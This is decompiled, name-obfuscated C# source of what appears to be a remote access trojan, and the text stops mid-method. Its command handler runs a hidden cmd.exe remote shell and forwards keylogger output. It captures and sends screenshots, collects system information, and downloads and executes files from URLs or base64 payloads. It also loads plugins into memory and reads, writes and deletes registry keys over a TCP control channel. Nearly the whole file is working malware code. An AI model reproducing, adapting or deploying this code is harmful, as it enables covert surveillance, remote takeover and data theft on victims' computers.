using System;
using System.Collections;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.IO.Compression;
using System.Net;
using System.Net.Sockets;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;

namespace ugoedvtvxp;

public class GClass0
{
	public FileInfo fileInfo_0;

	public object object_0;

	public string string_0;

	private Process process_0;

	public string string_1;

	public string string_2;

	public string string_3;

	public object object_1;

	public string string_4;

	public string string_5;

	public string string_6;

	public TcpClient tcpClient_0;

	public Mutex mutex_0;

	public string string_7;

	private string string_8;

	public string string_9;

	public string string_10;

	public GClass1 gclass1_0;

	public Computer computer_0;

	public string string_11;

	public object object_2;

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int GetWindowTextA(IntPtr intptr_0, [MarshalAs(UnmanagedType.VBByRefStr)] ref string string_12, int int_0);

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int GetWindowThreadProcessId(IntPtr intptr_0, ref int int_0);

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int GetWindowTextLengthA(long long_0);

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern IntPtr GetForegroundWindow();

	public string method_0()
	{
		checked
		{
			try
			{
				IntPtr foregroundWindow = GetForegroundWindow();
				if (foregroundWindow == IntPtr.Zero)
				{
					string string_ = " ";
					return method_18(ref string_);
				}
				int windowTextLengthA = GetWindowTextLengthA((long)foregroundWindow);
				string string_2 = Strings.StrDup(windowTextLengthA + 1, "*");
				GetWindowTextA(foregroundWindow, ref string_2, windowTextLengthA + 1);
				int int_ = default(int);
				GetWindowThreadProcessId(foregroundWindow, ref int_);
				if (int_ != 0)
				{
					try
					{
						string string_ = Process.GetProcessById(int_).MainWindowTitle;
						return method_18(ref string_);
					}
					catch (Exception projectError)
					{
						ProjectData.SetProjectError(projectError);
						string result = method_18(ref string_2);
						ProjectData.ClearProjectError();
						return result;
					}
				}
				return method_18(ref string_2);
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				string string_ = " ";
				string result = method_18(ref string_);
				ProjectData.ClearProjectError();
				return result;
			}
		}
	}

	public string method_1(uint uint_0)
	{
		StringBuilder stringBuilder = new StringBuilder(256);
		int localeInfo = GetLocaleInfo(1024u, uint_0, stringBuilder, stringBuilder.Capacity);
		if (localeInfo > 0)
		{
			return stringBuilder.ToString().Substring(0, checked(localeInfo - 1));
		}
		return "X";
	}

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int GetVolumeInformationA([MarshalAs(UnmanagedType.VBByRefStr)] ref string string_12, [MarshalAs(UnmanagedType.VBByRefStr)] ref string string_13, int int_0, ref int int_1, ref int int_2, ref int int_3, [MarshalAs(UnmanagedType.VBByRefStr)] ref string string_14, int int_4);

	[DllImport("kernel32.dll")]
	private static extern int GetLocaleInfo(uint uint_0, uint uint_1, [Out] StringBuilder stringBuilder_0, int int_0);

	public string method_2()
	{
		try
		{
			string string_ = Interaction.Environ("SystemDrive") + "\\";
			string string_2 = null;
			int int_ = 0;
			int int_2 = 0;
			string string_3 = null;
			int int_3 = default(int);
			GetVolumeInformationA(ref string_, ref string_2, 0, ref int_3, ref int_, ref int_2, ref string_3, 0);
			return Conversion.Hex(int_3);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			string result = "ERR";
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public bool method_3()
	{
		checked
		{
			try
			{
				string string_ = Strings.Space(100);
				int num = 0;
				do
				{
					short short_ = (short)num;
					string string_2 = null;
					if (!capGetDriverDescriptionA(short_, ref string_, 100, ref string_2, 100))
					{
						num++;
						continue;
					}
					return true;
				}
				while (num <= 4);
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
			return false;
		}
	}

	[STAThread]
	public static void Main()
	{
		GClass0 gClass = new GClass0();
		gClass.method_31();
	}

	[DllImport("avicap32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern bool capGetDriverDescriptionA(short short_0, [MarshalAs(UnmanagedType.VBByRefStr)] ref string string_12, int int_0, [MarshalAs(UnmanagedType.VBByRefStr)] ref string string_13, int int_1);

	private void method_4()
	{
		method_15(0);
	}

	[DllImport("ntdll")]
	private static extern int NtSetInformationProcess(IntPtr intptr_0, int int_0, ref int int_1, int int_2);

	public object method_5(byte[] byte_0, string string_12)
	{
		object obj = Assembly.Load(byte_0);
		return NewLateBinding.LateGet(obj, (Type)null, "CreateInstance", new object[1] { Strings.Split(Conversions.ToString(NewLateBinding.LateGet(obj, (Type)null, "FullName", new object[0], (string[])null, (Type[])null, (bool[])null)), ",", -1, (CompareMethod)0)[0] + "." + string_12 }, (string[])null, (Type[])null, (bool[])null);
	}

	public byte[] method_6(byte[] byte_0, ref bool bool_0)
	{
		checked
		{
			object[] array5;
			bool[] array3;
			if (bool_0)
			{
				object obj = new MemoryStream();
				object obj2 = new GZipStream((Stream)obj, CompressionMode.Compress, leaveOpen: true);
				object[] array = new object[3] { byte_0, 0, byte_0.Length };
				object[] array2 = array;
				array3 = new bool[3] { true, false, false };
				NewLateBinding.LateCall(obj2, (Type)null, "Write", array2, (string[])null, (Type[])null, array3, true);
				if (array3[0])
				{
					byte_0 = (byte[])Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array[0]), typeof(byte[]));
				}
				NewLateBinding.LateCall(obj2, (Type)null, "Dispose", new object[0], (string[])null, (Type[])null, (bool[])null, true);
				NewLateBinding.LateSet(obj, (Type)null, "Position", new object[1] { 0 }, (string[])null, (Type[])null);
				byte[] array4 = new byte[Conversions.ToInteger(NewLateBinding.LateGet(obj, (Type)null, "Length", new object[0], (string[])null, (Type[])null, (bool[])null)) + 1];
				array5 = new object[3] { array4, 0, array4.Length };
				object[] array6 = array5;
				array3 = new bool[3] { true, false, false };
				NewLateBinding.LateCall(obj, (Type)null, "Read", array6, (string[])null, (Type[])null, array3, true);
				if (array3[0])
				{
					array4 = (byte[])Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array5[0]), typeof(byte[]));
				}
				NewLateBinding.LateCall(obj, (Type)null, "Dispose", new object[0], (string[])null, (Type[])null, (bool[])null, true);
				return array4;
			}
			object obj3 = new MemoryStream(byte_0);
			object obj4 = new GZipStream((Stream)obj3, CompressionMode.Decompress);
			byte[] array7 = new byte[4];
			NewLateBinding.LateSet(obj3, (Type)null, "Position", new object[1] { Operators.SubtractObject(NewLateBinding.LateGet(obj3, (Type)null, "Length", new object[0], (string[])null, (Type[])null, (bool[])null), (object)5) }, (string[])null, (Type[])null);
			array5 = new object[3] { array7, 0, 4 };
			object[] array8 = array5;
			array3 = new bool[3] { true, false, false };
			NewLateBinding.LateCall(obj3, (Type)null, "Read", array8, (string[])null, (Type[])null, array3, true);
			if (array3[0])
			{
				array7 = (byte[])Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array5[0]), typeof(byte[]));
			}
			int num = BitConverter.ToInt32(array7, 0);
			NewLateBinding.LateSet(obj3, (Type)null, "Position", new object[1] { 0 }, (string[])null, (Type[])null);
			byte[] array9 = new byte[num - 1 + 1];
			array5 = new object[3] { array9, 0, num };
			object[] array10 = array5;
			array3 = new bool[3] { true, false, true };
			NewLateBinding.LateCall(obj4, (Type)null, "Read", array10, (string[])null, (Type[])null, array3, true);
			if (array3[0])
			{
				array9 = (byte[])Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array5[0]), typeof(byte[]));
			}
			if (array3[2])
			{
				num = (int)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array5[2]), typeof(int));
			}
			NewLateBinding.LateCall(obj4, (Type)null, "Dispose", new object[0], (string[])null, (Type[])null, (bool[])null, true);
			NewLateBinding.LateCall(obj3, (Type)null, "Dispose", new object[0], (string[])null, (Type[])null, (bool[])null, true);
			return array9;
		}
	}

	private void method_7(object object_3, object object_4)
	{
		try
		{
			string text = string_0;
			string string_ = Conversions.ToString(NewLateBinding.LateGet(object_4, (Type)null, "Data", new object[0], (string[])null, (Type[])null, (bool[])null));
			string text2 = method_18(ref string_);
			NewLateBinding.LateSetComplex(object_4, (Type)null, "Data", new object[1] { string_ }, (string[])null, (Type[])null, true, false);
			method_19("rs" + text + text2);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public Array method_8(byte[] byte_0, string string_12)
	{
		object obj = new List<byte[]>();
		object obj2 = new MemoryStream();
		object obj3 = new MemoryStream();
		string[] array = Strings.Split(method_10(ref byte_0), string_12, -1, (CompareMethod)0);
		object[] array2 = new object[3]
		{
			byte_0,
			0,
			array[0].Length
		};
		object[] array3 = array2;
		bool[] array4 = new bool[3] { true, false, false };
		NewLateBinding.LateCall(obj2, (Type)null, "Write", array3, (string[])null, (Type[])null, array4, true);
		if (array4[0])
		{
			byte_0 = (byte[])Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array2[0]), typeof(byte[]));
		}
		object[] array5 = checked(new object[3]
		{
			byte_0,
			array[0].Length + string_12.Length,
			byte_0.Length - (array[0].Length + string_12.Length)
		});
		object[] array6 = array5;
		array4 = new bool[3] { true, false, false };
		NewLateBinding.LateCall(obj3, (Type)null, "Write", array6, (string[])null, (Type[])null, array4, true);
		if (array4[0])
		{
			byte_0 = (byte[])Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array5[0]), typeof(byte[]));
		}
		array2 = new object[1];
		object[] array7 = array2;
		object obj4 = obj2;
		array7[0] = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(obj4, (Type)null, "ToArray", new object[0], (string[])null, (Type[])null, (bool[])null));
		array5 = array2;
		object[] array8 = array5;
		array4 = new bool[1] { true };
		NewLateBinding.LateCall(obj, (Type)null, "Add", array8, (string[])null, (Type[])null, array4, true);
		if (array4[0])
		{
			NewLateBinding.LateSetComplex(obj4, (Type)null, "ToArray", new object[1] { RuntimeHelpers.GetObjectValue(array5[0]) }, (string[])null, (Type[])null, true, false);
		}
		object[] array9 = new object[1];
		object[] array10 = array9;
		obj4 = obj3;
		array10[0] = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(obj4, (Type)null, "ToArray", new object[0], (string[])null, (Type[])null, (bool[])null));
		array2 = array9;
		object[] array11 = array2;
		array4 = new bool[1] { true };
		NewLateBinding.LateCall(obj, (Type)null, "Add", array11, (string[])null, (Type[])null, array4, true);
		if (array4[0])
		{
			NewLateBinding.LateSetComplex(obj4, (Type)null, "ToArray", new object[1] { RuntimeHelpers.GetObjectValue(array2[0]) }, (string[])null, (Type[])null, true, false);
		}
		NewLateBinding.LateCall(obj2, (Type)null, "Dispose", new object[0], (string[])null, (Type[])null, (bool[])null, true);
		NewLateBinding.LateCall(obj3, (Type)null, "Dispose", new object[0], (string[])null, (Type[])null, (bool[])null, true);
		return (Array)NewLateBinding.LateGet(obj, (Type)null, "ToArray", new object[0], (string[])null, (Type[])null, (bool[])null);
	}

	private void method_9()
	{
		try
		{
			method_19("rsc");
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public string method_10(ref byte[] byte_0)
	{
		return Encoding.Default.GetString(byte_0);
	}

	public void method_11(byte[] byte_0)
	{
		//IL_0b1e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0b25: Expected O, but got Unknown
		string[] array = Strings.Split(method_10(ref byte_0), string_0, -1, (CompareMethod)0);
		checked
		{
			try
			{
				switch (array[0])
				{
				case "rss":
					try
					{
						NewLateBinding.LateCall((object)process_0, (Type)null, "Kill", new object[0], (string[])null, (Type[])null, (bool[])null, true);
					}
					catch (Exception projectError2)
					{
						ProjectData.SetProjectError(projectError2);
						ProjectData.ClearProjectError();
					}
					process_0 = new Process();
					NewLateBinding.LateSetComplex(NewLateBinding.LateGet((object)process_0, (Type)null, "StartInfo", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "RedirectStandardOutput", new object[1] { true }, (string[])null, (Type[])null, false, true);
					NewLateBinding.LateSetComplex(NewLateBinding.LateGet((object)process_0, (Type)null, "StartInfo", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "RedirectStandardInput", new object[1] { true }, (string[])null, (Type[])null, false, true);
					NewLateBinding.LateSetComplex(NewLateBinding.LateGet((object)process_0, (Type)null, "StartInfo", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "RedirectStandardError", new object[1] { true }, (string[])null, (Type[])null, false, true);
					NewLateBinding.LateSetComplex(NewLateBinding.LateGet((object)process_0, (Type)null, "StartInfo", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "FileName", new object[1] { "cmd.exe" }, (string[])null, (Type[])null, false, true);
					NewLateBinding.LateSetComplex(NewLateBinding.LateGet((object)process_0, (Type)null, "StartInfo", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "RedirectStandardError", new object[1] { true }, (string[])null, (Type[])null, false, true);
					process_0.OutputDataReceived += method_7;
					process_0.ErrorDataReceived += method_7;
					process_0.Exited += delegate
					{
						method_9();
					};
					NewLateBinding.LateSetComplex(NewLateBinding.LateGet((object)process_0, (Type)null, "StartInfo", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "UseShellExecute", new object[1] { false }, (string[])null, (Type[])null, false, true);
					NewLateBinding.LateSetComplex(NewLateBinding.LateGet((object)process_0, (Type)null, "StartInfo", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "CreateNoWindow", new object[1] { true }, (string[])null, (Type[])null, false, true);
					NewLateBinding.LateSetComplex(NewLateBinding.LateGet((object)process_0, (Type)null, "StartInfo", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "WindowStyle", new object[1] { ProcessWindowStyle.Hidden }, (string[])null, (Type[])null, false, true);
					NewLateBinding.LateSet((object)process_0, (Type)null, "EnableRaisingEvents", new object[1] { true }, (string[])null, (Type[])null);
					method_19("rss");
					NewLateBinding.LateCall((object)process_0, (Type)null, "Start", new object[0], (string[])null, (Type[])null, (bool[])null, true);
					NewLateBinding.LateCall((object)process_0, (Type)null, "BeginErrorReadLine", new object[0], (string[])null, (Type[])null, (bool[])null, true);
					NewLateBinding.LateCall((object)process_0, (Type)null, "BeginOutputReadLine", new object[0], (string[])null, (Type[])null, (bool[])null, true);
					break;
				case "rs":
					NewLateBinding.LateCall(NewLateBinding.LateGet((object)process_0, (Type)null, "StandardInput", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "WriteLine", new object[1] { method_16(ref array[1]) }, (string[])null, (Type[])null, (bool[])null, true);
					break;
				case "rsc":
					try
					{
						NewLateBinding.LateCall((object)process_0, (Type)null, "Kill", new object[0], (string[])null, (Type[])null, (bool[])null, true);
					}
					catch (Exception projectError)
					{
						ProjectData.SetProjectError(projectError);
						ProjectData.ClearProjectError();
					}
					process_0 = null;
					break;
				case "kl":
					method_19("kl" + string_0 + method_18(ref gclass1_0.string_1));
					break;
				case "inf":
				{
					string text7 = "inf" + string_0;
					if (Operators.CompareString(method_25("vn"), "", false) == 0)
					{
						string text8 = text7;
						string string_ = method_16(ref string_10) + "_" + method_2();
						text7 = text8 + method_18(ref string_) + string_0;
					}
					else
					{
						string text9 = text7;
						string string_ = method_25("vn");
						string string_2 = method_16(ref string_) + "_" + method_2();
						text7 = text9 + method_18(ref string_2) + string_0;
					}
					text7 = text7 + string_3 + ":" + this.string_2 + string_0;
					text7 = text7 + string_5 + string_0;
					text7 = text7 + string_6 + string_0;
					text7 += Process.GetCurrentProcess().ProcessName;
					method_19(text7);
					break;
				}
				case "prof":
				{
					string text6 = array[1];
					if (Operators.CompareString(text6, "~", false) == 0)
					{
						method_24(array[2], array[3]);
					}
					else if (Operators.CompareString(text6, "!", false) == 0)
					{
						method_24(array[2], array[3]);
						method_19("getvalue" + string_0 + array[1] + string_0 + method_25(array[1]));
					}
					else if (Operators.CompareString(text6, "~", false) == 0)
					{
						method_27(array[2]);
					}
					break;
				}
				case "rn":
				{
					byte[] array29 = null;
					if (!array[2].ToLower().StartsWith("http"))
					{
						byte[] byte_3 = Convert.FromBase64String(array[2]);
						bool bool_ = false;
						array29 = method_6(byte_3, ref bool_);
					}
					else
					{
						object obj7 = new WebClient();
						object[] array27 = new object[1];
						object[] array30 = array27;
						int num2 = 2;
						array30[0] = array[2];
						object[] array11 = array27;
						object[] array31 = array11;
						bool[] array13 = new bool[1] { true };
						object obj8 = NewLateBinding.LateGet(obj7, (Type)null, "DownloadData", array31, (string[])null, (Type[])null, array13);
						if (array13[0])
						{
							array[num2] = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array11[0]), typeof(string));
						}
						array29 = (byte[])obj8;
					}
					method_19("bla");
					string text11 = Interaction.Environ("temp") + "\\" + method_14(10) + "." + array[1];
					File.WriteAllBytes(text11, array29);
					Process.Start(text11);
					break;
				}
				case "inv":
				{
					method_19("bla");
					string text10 = method_25(array[1]);
					byte[] array25;
					if (text10.Length > 0)
					{
						array25 = Convert.FromBase64String(text10);
						method_19("pl" + string_0 + array[1] + string_0 + Conversions.ToString(0));
					}
					else
					{
						if (array[3].Length == 1)
						{
							method_19("pl" + string_0 + array[1] + string_0 + "False");
							break;
						}
						byte[] byte_2 = Convert.FromBase64String(array[3]);
						bool bool_ = false;
						array25 = method_6(byte_2, ref bool_);
						if (Conversions.ToBoolean(method_24(array[1], Convert.ToBase64String(array25))))
						{
							method_19("pl" + string_0 + array[1] + string_0 + Conversions.ToString(0));
						}
					}
					object objectValue = RuntimeHelpers.GetObjectValue(method_5(array25, "A"));
					NewLateBinding.LateSet(objectValue, (Type)null, "h", new object[1] { string_3 }, (string[])null, (Type[])null);
					NewLateBinding.LateSet(objectValue, (Type)null, "p", new object[1] { this.string_2 }, (string[])null, (Type[])null);
					NewLateBinding.LateSet(objectValue, (Type)null, "osk", new object[1] { array[2] }, (string[])null, (Type[])null);
					NewLateBinding.LateCall(objectValue, (Type)null, "start", new object[0], (string[])null, (Type[])null, (bool[])null, true);
					while (!Conversions.ToBoolean(Operators.OrObject((object)(object_1 == null), Operators.CompareObjectEqual(NewLateBinding.LateGet(objectValue, (Type)null, "Off", new object[0], (string[])null, (Type[])null, (bool[])null), (object)true, false))))
					{
						Thread.Sleep(1);
					}
					NewLateBinding.LateSet(objectValue, (Type)null, "off", new object[1] { true }, (string[])null, (Type[])null);
					break;
				}
				case "ret":
				{
					method_19("bla");
					string text12 = method_25(array[1]);
					byte[] array32;
					if (text12.Length > 0)
					{
						array32 = Convert.FromBase64String(text12);
						method_19("pl" + string_0 + array[1] + string_0 + Conversions.ToString(0));
					}
					else
					{
						if (array[2].Length == 1)
						{
							method_19("pl" + string_0 + array[1] + string_0 + "True");
							break;
						}
						byte[] byte_4 = Convert.FromBase64String(array[2]);
						bool bool_ = false;
						array32 = method_6(byte_4, ref bool_);
						if (Conversions.ToBoolean(method_24(array[1], Convert.ToBase64String(array32))))
						{
							method_19("pl" + string_0 + array[1] + string_0 + Conversions.ToString(0));
						}
					}
					object objectValue2 = RuntimeHelpers.GetObjectValue(method_5(array32, "A"));
					string[] array7 = new string[5]
					{
						"ret",
						string_0,
						array[1],
						string_0,
						null
					};
					string[] array33 = array7;
					string string_2 = Conversions.ToString(NewLateBinding.LateGet(objectValue2, (Type)null, "GT", new object[0], (string[])null, (Type[])null, (bool[])null));
					array33[4] = method_18(ref string_2);
					method_19(string.Concat(array7));
					break;
				}
				case "CAP":
				{
					int width = Screen.get_PrimaryScreen().get_Bounds().Width;
					Rectangle rectangle = Screen.get_PrimaryScreen().get_Bounds();
					Bitmap val = new Bitmap(width, rectangle.Height);
					Graphics val2 = Graphics.FromImage((Image)(object)val);
					Size size = new Size(((Image)val).get_Width(), ((Image)val).get_Height());
					val2.CopyFromScreen(0, 0, 0, 0, size, (CopyPixelOperation)13369376);
					try
					{
						Cursor @default = Cursors.get_Default();
						Point position = Cursor.get_Position();
						size = new Size(32, 32);
						rectangle = new Rectangle(position, size);
						@default.Draw(val2, rectangle);
					}
					catch (Exception projectError3)
					{
						ProjectData.SetProjectError(projectError3);
						ProjectData.ClearProjectError();
					}
					val2.Dispose();
					MemoryStream memoryStream = new MemoryStream();
					string string_2 = "CAP" + string_0;
					byte_0 = method_12(ref string_2);
					memoryStream.Write(byte_0, 0, byte_0.Length);
					MemoryStream memoryStream2 = new MemoryStream();
					IntPtr intPtr = default(IntPtr);
					((Image)val).GetThumbnailImage(Conversions.ToInteger(array[1]), Conversions.ToInteger(array[2]), (GetThumbnailImageAbort)null, intPtr).Save((Stream)memoryStream2, ImageFormat.get_Jpeg());
					memoryStream.Write(memoryStream2.ToArray(), 0, (int)memoryStream2.Length);
					method_17(memoryStream.ToArray());
					memoryStream.Dispose();
					memoryStream2.Dispose();
					((Image)val).Dispose();
					break;
				}
				case "P":
					method_19("P");
					break;
				case "un":
					switch (array[1])
					{
					case "~":
						method_23();
						break;
					case "!":
						method_15(0);
						ProjectData.EndApp();
						break;
					case "@":
					{
						method_15(0);
						Type typeFromHandle = typeof(Process);
						object[] array11 = new object[1];
						object[] array26 = array11;
						object obj6 = fileInfo_0;
						array26[0] = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(obj6, (Type)null, "FullName", new object[0], (string[])null, (Type[])null, (bool[])null));
						object[] array27 = array11;
						object[] array28 = array27;
						bool[] array13 = new bool[1] { true };
						NewLateBinding.LateCall((object)null, typeFromHandle, "Start", array28, (string[])null, (Type[])null, array13, true);
						if (array13[0])
						{
							NewLateBinding.LateSetComplex(obj6, (Type)null, "FullName", new object[1] { RuntimeHelpers.GetObjectValue(array27[0]) }, (string[])null, (Type[])null, true, false);
						}
						ProjectData.EndApp();
						break;
					}
					}
					break;
				case "up":
				{
					byte[] array22 = null;
					if (!array[1].ToLower().StartsWith("http"))
					{
						byte[] byte_ = Convert.FromBase64String(array[1]);
						bool bool_ = false;
						array22 = method_6(byte_, ref bool_);
					}
					else
					{
						object obj4 = new WebClient();
						object[] array4 = new object[1];
						object[] array23 = array4;
						int num2 = 1;
						array23[0] = array[1];
						object[] array11 = array4;
						object[] array24 = array11;
						bool[] array13 = new bool[1] { true };
						object obj5 = NewLateBinding.LateGet(obj4, (Type)null, "DownloadData", array24, (string[])null, (Type[])null, array13);
						if (array13[0])
						{
							array[num2] = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array11[0]), typeof(string));
						}
						array22 = (byte[])obj5;
					}
					method_19("bla");
					NewLateBinding.LateCall(NewLateBinding.LateGet(NewLateBinding.LateGet((object)computer_0, (Type)null, "Registry", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "CurrentUser", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "SetValue", new object[2] { "di", "" }, (string[])null, (Type[])null, (bool[])null, true);
					string text5 = Interaction.Environ("temp") + "\\" + method_14(10) + ".exe";
					File.WriteAllBytes(text5, array22);
					Process.Start(text5, "UP:" + Conversions.ToString(Process.GetCurrentProcess().Id));
					int num4 = 0;
					do
					{
						Thread.Sleep(10);
						if (Operators.ConditionalCompareObjectEqual(NewLateBinding.LateGet(NewLateBinding.LateGet(NewLateBinding.LateGet((object)computer_0, (Type)null, "Registry", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "CurrentUser", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "GetValue", new object[2] { "di", "" }, (string[])null, (Type[])null, (bool[])null), (object)"!", false))
						{
							method_23();
						}
						num4++;
					}
					while (num4 <= 500);
					break;
				}
				case "RG":
				{
					object obj = method_13(array[2]);
					switch (array[1])
					{
					case "~":
					{
						string text = "RG" + string_0 + "~" + string_0 + array[2] + string_0;
						string text2 = "";
						IEnumerator enumerator = default(IEnumerator);
						try
						{
							enumerator = ((IEnumerable)NewLateBinding.LateGet(obj, (Type)null, "GetSubKeyNames", new object[0], (string[])null, (Type[])null, (bool[])null)).GetEnumerator();
							while (enumerator.MoveNext())
							{
								string text3 = Conversions.ToString(enumerator.Current);
								if (!text3.Contains("\\"))
								{
									text2 = text2 + text3 + string_0;
								}
							}
						}
						finally
						{
							if (enumerator is IDisposable)
							{
								(enumerator as IDisposable).Dispose();
							}
						}
						IEnumerator enumerator2 = default(IEnumerator);
						try
						{
							enumerator2 = ((IEnumerable)NewLateBinding.LateGet(obj, (Type)null, "GetValueNames", new object[0], (string[])null, (Type[])null, (bool[])null)).GetEnumerator();
							while (enumerator2.MoveNext())
							{
								string text4 = Conversions.ToString(enumerator2.Current);
								string[] array7 = new string[7] { text2, text4, "/", null, null, null, null };
								string[] array8 = array7;
								object[] array2 = new object[1] { text4 };
								object[] array9 = array2;
								bool[] array6 = new bool[1] { true };
								object obj2 = NewLateBinding.LateGet(obj, (Type)null, "GetValueKind", array9, (string[])null, (Type[])null, array6);
								if (array6[0])
								{
									text4 = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array2[0]), typeof(string));
								}
								array8[3] = obj2.ToString();
								array7[4] = "/";
								string[] array10 = array7;
								object[] array11 = new object[2] { text4, "" };
								object[] array12 = array11;
								bool[] array13 = new bool[2] { true, false };
								object obj3 = NewLateBinding.LateGet(obj, (Type)null, "GetValue", array12, (string[])null, (Type[])null, array13);
								if (array13[0])
								{
									text4 = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array11[0]), typeof(string));
								}
								array10[5] = obj3.ToString();
								array7[6] = string_0;
								text2 = string.Concat(array7);
							}
						}
						finally
						{
							if (enumerator2 is IDisposable)
							{
								(enumerator2 as IDisposable).Dispose();
							}
						}
						method_19(text + text2);
						break;
					}
					case "!":
					{
						object[] array2 = new object[3];
						object[] array16 = array2;
						int num2 = 3;
						array16[0] = array[3];
						object[] array17 = array2;
						int num3 = 4;
						array17[1] = array[4];
						object[] array18 = array2;
						int num = 5;
						array18[2] = array[5];
						object[] array4 = array2;
						object[] array19 = array4;
						bool[] array6 = new bool[3] { true, true, true };
						NewLateBinding.LateCall(obj, (Type)null, "SetValue", array19, (string[])null, (Type[])null, array6, true);
						if (array6[0])
						{
							array[num2] = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array4[0]), typeof(string));
						}
						if (array6[1])
						{
							array[num3] = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array4[1]), typeof(string));
						}
						if (array6[2])
						{
							array[num] = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array4[2]), typeof(string));
						}
						break;
					}
					case "@":
					{
						object[] array2 = new object[2];
						object[] array20 = array2;
						int num = 3;
						array20[0] = array[3];
						array2[1] = false;
						object[] array4 = array2;
						object[] array21 = array4;
						bool[] array6 = new bool[2] { true, false };
						NewLateBinding.LateCall(obj, (Type)null, "DeleteValue", array21, (string[])null, (Type[])null, array6, true);
						if (array6[0])
						{
							array[num] = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array4[0]), typeof(string));
						}
						break;
					}
					case "#":
					{
						object[] array2 = new object[1];
						object[] array14 = array2;
						int num = 3;
						array14[0] = array[3];
						object[] array4 = array2;
						object[] array15 = array4;
						bool[] array6 = new bool[1] { true };
						NewLateBinding.LateCall(obj, (Type)null, "CreateSubKey", array15, (string[])null, (Type[])null, array6, true);
						if (array6[0])
						{
							array[num] = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array4[0]), typeof(string));
						}
						break;
					}
					case "$":
					{
						object[] array2 = new object[1];
						object[] array3 = array2;
						int num = 3;
						array3[0] = array[3];
						object[] array4 = array2;
						object[] array5 = array4;
						bool[] array6 = new bool[1] { true };
						NewLateBinding.LateCall(obj, (Type)null, "DeleteSubKeyTree", array5, (string[])null, (Type[])null, array6, true);
						if (array6[0])
						{
							array[num] = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array4[0]), typeof(string));
						}
						break;
					}
					}
					break;
				}
				}
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				try
				{
					method_19("ER" + string_0 + array[0] + string_0 + ex2.Message);
					if ((Operators.CompareString(array[0], "up", false) == 0) | (Operators.CompareString(array[0], "rn", false) == 0))
					{
						method_19("bla");
					}
				}
				catch (Exception projectError4)
				{
					ProjectData.SetProjectError(projectError4);
					ProjectData.ClearProjectError();
				}
				ProjectData.ClearProjectError();
			}
		}
	}

	public byte[] method_12(ref string string_12)
	{
		return Encoding.Default.GetBytes(string_12);
	}

	public RegistryKey method_13(string string_12)
	{
		if (string_12.StartsWith(Conversions.ToString(NewLateBinding.LateGet(NewLateBinding.LateGet(NewLateBinding.LateGet((object)computer_0, (Type)null, "Registry", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "ClassesRoot", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "Name", new object[0], (string[])null, (Type[])null, (bool[])null))))
		{
			string text = string_12.Replace(Conversions.ToString(Operators.ConcatenateObject(NewLateBinding.LateGet(NewLateBinding.LateGet(NewLateBinding.LateGet((object)computer_0, (Type)null, "Registry", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "ClassesRoot", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "Name", new object[0], (string[])null, (Type[])null, (bool[])null), (object)"\\")), "");
